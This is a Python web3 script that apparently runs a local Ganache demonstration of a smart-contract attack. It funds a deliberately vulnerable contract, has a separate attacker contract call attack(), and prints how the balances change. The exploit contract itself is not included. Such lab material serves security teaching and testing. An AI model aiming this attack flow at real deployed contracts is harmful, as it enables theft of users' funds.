
from web3 import Web3
import json
import os

# Connect to Ganache or another Ethereum node
ganache_url = "http://127.0.0.1:7545"
web3 = Web3(Web3.HTTPProvider(ganache_url))

# Check if connected to the Ethereum node
if web3.isConnected():
    print("Connected to Ethereum node")
else:
    raise Exception("Failed to connect to Ethereum node")

# Set default account to send Ether from (use the first account from Ganache)
web3.eth.default_account = web3.eth.accounts[0]

# Load contract ABIs and addresses
CONTRACTS_PATH = "./build/contracts"

## Helper function to load contract ABIs and addresses
def load_contracts(path, deployed_addresses):
    contracts = {}
    for filename in os.listdir(path):
        if filename.endswith(".json"):
            with open(os.path.join(path, filename)) as f:
                contract_data = json.load(f)
                contract_name = filename.split(".")[0]
                if contract_name in deployed_addresses:
                    # Store contract object with ABI and address
                    contracts[contract_name] = {
                        'abi': contract_data['abi'],
                        'address': deployed_addresses[contract_name]
                    }
    return contracts

# Load deployed contract addresses from deployed_contracts.json
with open('deployed_contracts.json') as f:
    deployed_addresses = json.load(f)

# Load contracts from ABIs and addresses
contracts = load_contracts(CONTRACTS_PATH, deployed_addresses)

# Create contract instances using Web3
vulnerable_contract = web3.eth.contract(
    address=Web3.toChecksumAddress(contracts['SimpleVulnerableContract']['address']),
    abi=contracts['SimpleVulnerableContract']['abi']
)

attacker_contract = web3.eth.contract(
    address=Web3.toChecksumAddress(contracts['SimpleAttacker']['address']),
    abi=contracts['SimpleAttacker']['abi']
)


# Fund the vulnerable contract with some Ether
tx_hash = web3.eth.send_transaction({
    'from': web3.eth.accounts[0],
    'to': vulnerable_contract.address,
    'value': web3.toWei(0.01, 'ether')
})
web3.eth.wait_for_transaction_receipt(tx_hash)

# Attacker initiates the attack
tx_hash = attacker_contract.functions.attack().transact({
    'from': web3.eth.accounts[1],
    'value': web3.toWei(100, 'gwei'),
    'gas': 5000000
})
web3.eth.wait_for_transaction_receipt(tx_hash)
# Wait for the transaction to be mined
tx_receipt = web3.eth.wait_for_transaction_receipt(tx_hash)

# Print the transaction receipt for debugging
# print(f"Transaction hash: {tx_hash.hex()}")
# print(f"Transaction receipt: {tx_receipt}")

# Check the balance of the vulnerable contract after the attack
vulnerable_balance = web3.eth.get_balance(vulnerable_contract.address)
attacker_balance = web3.eth.get_balance(attacker_contract.address)

print(f"Vulnerable contract {vulnerable_contract.address} balance after attack: {web3.fromWei(vulnerable_balance, 'gwei')} gwei")
print(f"Attacker contract {attacker_contract.address} balance after attack: {web3.fromWei(attacker_balance, 'gwei')} gwei")
